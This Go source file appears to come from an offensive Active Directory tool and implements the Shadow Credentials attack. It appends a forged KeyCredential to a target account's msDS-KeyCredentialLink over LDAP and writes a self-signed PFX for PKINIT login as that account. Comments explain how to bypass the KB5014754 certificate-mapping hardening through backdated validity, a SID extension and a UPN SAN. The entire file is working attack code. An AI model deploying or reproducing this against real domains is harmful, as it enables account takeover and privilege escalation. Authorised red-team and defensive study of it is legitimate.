package shadow

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/hex"
	"errors"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	goldap "github.com/go-ldap/ldap/v3"
	"golang.org/x/crypto/cryptobyte"
	cryptobyte_asn1 "golang.org/x/crypto/cryptobyte/asn1"

	"github.com/ajm4n/certigo/internal/pki"
)

// msDSKeyCredentialLink is the AD attribute that carries the DNBinary-
// encoded KeyCredential entries (MS-ADA3 §2.261).
const attrKeyCredentialLink = "msDS-KeyCredentialLink"

// Options bundles the inputs shared by every shadow action.
type Options struct {
	Conn     *goldap.Conn
	TargetDN string
	OutPFX   string
	PFXPass  string
	// TargetSID, when supplied, is embedded in the generated cert's
	// szOID_NTDS_CA_SECURITY_EXT extension — required by KDCs in
	// StrongCertificateBindingEnforcement=2 (KB5014754) for PKINIT to
	// succeed via shadow-creds. Empty SID falls back to legacy
	// implicit mapping; works on compat-mode DCs only.
	TargetSID string
	// TargetUPN, when supplied, becomes a SAN otherName entry under
	// id-ms-principalName so PKINIT clients can match the cert to a
	// principal. Recommended whenever the target has a UPN populated.
	TargetUPN string
}

// Add generates a new RSA 2048 key, builds a KeyCredential referencing the
// matching public key, appends the DNBinary-encoded blob to the target's
// msDS-KeyCredentialLink, and writes a self-signed cert + key PFX to
// OutPFX so the caller can follow up with PKINIT via `certigo auth -pfx`.
// It returns the DeviceID (lowercase hex without dashes) of the new entry.
func Add(opts Options) (string, error) {
	if err := validateLDAPOpts(opts); err != nil {
		return "", err
	}

	priv, err := pki.GenerateRSAKey(2048)
	if err != nil {
		return "", fmt.Errorf("shadow: generate RSA: %w", err)
	}

	kc, err := NewRSAKeyCredential(&priv.PublicKey)
	if err != nil {
		return "", err
	}

	dnBinary := kc.MarshalDNBinary(opts.TargetDN)
	if dnBinary == "" {
		return "", fmt.Errorf("shadow: marshal DNBinary failed")
	}

	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Add(attrKeyCredentialLink, []string{dnBinary})
	if err := opts.Conn.Modify(mod); err != nil {
		return "", fmt.Errorf("shadow: LDAP modify (add): %w", err)
	}

	if opts.OutPFX != "" {
		if err := writeSelfSignedPFX(priv, opts.TargetDN, opts.TargetSID, opts.TargetUPN, opts.OutPFX, opts.PFXPass); err != nil {
			return "", fmt.Errorf("shadow: write PFX: %w", err)
		}
	}

	return hex.EncodeToString(kc.DeviceID[:]), nil
}

// List fetches msDS-KeyCredentialLink for the target and decodes each
// value into a *KeyCredential.
func List(opts Options) ([]*KeyCredential, error) {
	if err := validateLDAPOpts(opts); err != nil {
		return nil, err
	}
	entries, err := readKeyCredentialLink(opts.Conn, opts.TargetDN)
	if err != nil {
		return nil, err
	}
	out := make([]*KeyCredential, 0, len(entries))
	for _, raw := range entries {
		kc, _, perr := ParseDNBinary(raw)
		if perr != nil {
			// Skip garbage rather than fail the whole call.
			continue
		}
		out = append(out, kc)
	}
	return out, nil
}

// Info is List today - callers distinguish "info" by choosing a more
// verbose formatter. The signature matches the spec and leaves room for
// pulling decoded-KeyMaterial extras in the future.
func Info(opts Options) ([]*KeyCredential, error) { return List(opts) }

// Clear removes ALL msDS-KeyCredentialLink values with a single LDAP
// REPLACE carrying an empty list - the canonical way to empty a
// multi-valued attribute.
func Clear(opts Options) error {
	if err := validateLDAPOpts(opts); err != nil {
		return err
	}
	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Replace(attrKeyCredentialLink, []string{})
	if err := opts.Conn.Modify(mod); err != nil {
		return fmt.Errorf("shadow: LDAP modify (clear): %w", err)
	}
	return nil
}

// Remove deletes the single msDS-KeyCredentialLink entry whose DeviceID
// matches the hex string deviceID. Dashes in the input are tolerated.
// Because AD does not let us delete individual values of a DNBinary
// multi-valued attribute by identifier, we read every value, parse it,
// and rewrite the attribute with REPLACE omitting the target.
func Remove(opts Options, deviceID string) error {
	if err := validateLDAPOpts(opts); err != nil {
		return err
	}
	want, err := parseDeviceID(deviceID)
	if err != nil {
		return err
	}

	raws, err := readKeyCredentialLink(opts.Conn, opts.TargetDN)
	if err != nil {
		return err
	}
	if len(raws) == 0 {
		return fmt.Errorf("shadow: target has no msDS-KeyCredentialLink entries")
	}

	keep := make([]string, 0, len(raws))
	found := false
	for _, v := range raws {
		kc, _, perr := ParseDNBinary(v)
		if perr != nil {
			// Unparseable entries are preserved - we only remove the
			// specific match.
			keep = append(keep, v)
			continue
		}
		if kc.DeviceID == want {
			found = true
			continue
		}
		keep = append(keep, v)
	}
	if !found {
		return fmt.Errorf("shadow: DeviceID %x not present on target", want[:])
	}

	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Replace(attrKeyCredentialLink, keep)
	if err := opts.Conn.Modify(mod); err != nil {
		return fmt.Errorf("shadow: LDAP modify (remove): %w", err)
	}
	return nil
}

// readKeyCredentialLink issues a base-scope search for the one attribute
// we care about and returns the raw DNBinary string values.
func readKeyCredentialLink(conn *goldap.Conn, dn string) ([]string, error) {
	req := goldap.NewSearchRequest(
		dn,
		goldap.ScopeBaseObject,
		goldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{attrKeyCredentialLink},
		nil,
	)
	res, err := conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("shadow: LDAP search %s: %w", dn, err)
	}
	if len(res.Entries) == 0 {
		return nil, fmt.Errorf("shadow: target DN not found: %s", dn)
	}
	return res.Entries[0].GetAttributeValues(attrKeyCredentialLink), nil
}

// parseDeviceID normalizes a hex or dashed-GUID string into a 16-byte
// array. Accepts the two common Certipy output forms.
func parseDeviceID(s string) ([16]byte, error) {
	clean := strings.ReplaceAll(s, "-", "")
	clean = strings.TrimSpace(clean)
	b, err := hex.DecodeString(clean)
	if err != nil {
		return [16]byte{}, fmt.Errorf("shadow: decode DeviceID %q: %w", s, err)
	}
	if len(b) != 16 {
		return [16]byte{}, fmt.Errorf("shadow: DeviceID must be 16 bytes, got %d", len(b))
	}
	var out [16]byte
	copy(out[:], b)
	return out, nil
}

// validateLDAPOpts ensures a non-nil connection + a target DN are in
// place. DN validation beyond presence is deferred to the server.
func validateLDAPOpts(opts Options) error {
	if opts.Conn == nil {
		return errors.New("shadow: nil LDAP connection")
	}
	if strings.TrimSpace(opts.TargetDN) == "" {
		return errors.New("shadow: TargetDN is required")
	}
	return nil
}

// writeSelfSignedPFX creates a self-signed cert for priv with a CN
// derived from the target DN, wraps (cert, key) into a PFX, and writes
// it to path. We reuse pki.SavePFX so the Modern2023 encoder is
// consistent with every other certigo code path.
//
// Strong-mapping defenses against KB5014754 (CVE-2022-26931):
//
//  1. NotBefore pinned to 2018 — well before the May 2022 enforcement
//     boundary. DCs in compat mode (=1, the post-patch default) accept
//     pre-dated certs via legacy implicit mapping.
//  2. When targetSID is non-empty, embed it in the
//     szOID_NTDS_CA_SECURITY_EXT extension (1.3.6.1.4.1.311.25.2).
//     Required by DCs in strict mode (=2).
//  3. When targetUPN is non-empty, add a SAN otherName entry under
//     id-ms-principalName (1.3.6.1.4.1.311.20.2.3). PKINIT clients
//     and KDCs match the cert to a principal via this SAN.
//  4. Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) — Windows KDCs
//     reject PKINIT certs without it as
//     KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED (75).
//
// All extensions encoded with cryptobyte for clean nesting; the
// encoding/asn1 struct-tag-rewrite trick produces lengths that point
// at the wrong layer and break downstream parsers.
func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, targetSID, targetUPN, path, password string) error {
	cn := cnFromDN(targetDN)
	if cn == "" {
		cn = "certigo-shadow"
	}
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return fmt.Errorf("serial: %w", err)
	}
	oidSmartCardLogon := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 2}
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             time.Date(2018, 1, 1, 0, 0, 0, 0, time.UTC),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		UnknownExtKeyUsage:    []asn1.ObjectIdentifier{oidSmartCardLogon},
		BasicConstraintsValid: true,
	}
	if targetSID != "" {
		ext, err := buildNTDSObjectSIDExtension(targetSID)
		if err != nil {
			return fmt.Errorf("NTDS SID extension: %w", err)
		}
		tmpl.ExtraExtensions = append(tmpl.ExtraExtensions, ext)
	}
	if targetUPN != "" {
		ext, err := buildPrincipalNameSANExtension(targetUPN)
		if err != nil {
			return fmt.Errorf("SAN UPN extension: %w", err)
		}
		tmpl.ExtraExtensions = append(tmpl.ExtraExtensions, ext)
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return fmt.Errorf("parse certificate: %w", err)
	}
	pfx, err := pki.SavePFX(&pki.Certificate{Cert: cert, Key: priv}, password)
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, pfx, 0o600); err != nil {
		return fmt.Errorf("write %s: %w", path, err)
	}
	return nil
}

// buildNTDSObjectSIDExtension constructs the
// szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) extension that
// KB5014754-strict DCs require for PKINIT certificate strong-mapping.
//
// Wire layout:
//
//	SEQUENCE {
//	  [0] EXPLICIT SEQUENCE {
//	    OID 1.3.6.1.4.1.311.25.2.1 (szOID_NTDS_OBJECTSID)
//	    [0] EXPLICIT OCTET STRING <"S-1-5-21-..." UTF-8 bytes>
//	  }
//	}
func buildNTDSObjectSIDExtension(sid string) (pkix.Extension, error) {
	oidNTDSCASecExt := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2}
	oidNTDSObjectSID := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2, 1}

	var b cryptobyte.Builder
	b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
		b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
			b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
				b.AddASN1ObjectIdentifier(oidNTDSObjectSID)
				b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
					b.AddASN1OctetString([]byte(sid))
				})
			})
		})
	})
	val, err := b.Bytes()
	if err != nil {
		return pkix.Extension{}, err
	}
	return pkix.Extension{Id: oidNTDSCASecExt, Critical: false, Value: val}, nil
}

// buildPrincipalNameSANExtension constructs a SubjectAltName extension
// with a single otherName entry carrying the UPN under Microsoft's
// id-ms-principalName OID (1.3.6.1.4.1.311.20.2.3).
//
// Wire layout:
//
//	SEQUENCE (GeneralNames) {
//	  [0] IMPLICIT (otherName) {
//	    OID 1.3.6.1.4.1.311.20.2.3
//	    [0] EXPLICIT { UTF8String "user@DOMAIN" }
//	  }
//	}
func buildPrincipalNameSANExtension(upn string) (pkix.Extension, error) {
	oidSAN := asn1.ObjectIdentifier{2, 5, 29, 17}
	oidMSPrincipalName := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}

	var b cryptobyte.Builder
	b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
		b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
			b.AddASN1ObjectIdentifier(oidMSPrincipalName)
			b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
				b.AddASN1(cryptobyte_asn1.UTF8String, func(b *cryptobyte.Builder) {
					b.AddBytes([]byte(upn))
				})
			})
		})
	})
	val, err := b.Bytes()
	if err != nil {
		return pkix.Extension{}, err
	}
	return pkix.Extension{Id: oidSAN, Critical: false, Value: val}, nil
}

// cnFromDN returns the left-most CN= component of a DN, unescaped enough
// for a self-signed cert subject. Falls back to the raw DN on failure.
func cnFromDN(dn string) string {
	parsed, err := goldap.ParseDN(dn)
	if err != nil || parsed == nil || len(parsed.RDNs) == 0 {
		return ""
	}
	for _, rdn := range parsed.RDNs {
		for _, av := range rdn.Attributes {
			if strings.EqualFold(av.Type, "CN") {
				return av.Value
			}
		}
	}
	return ""
}
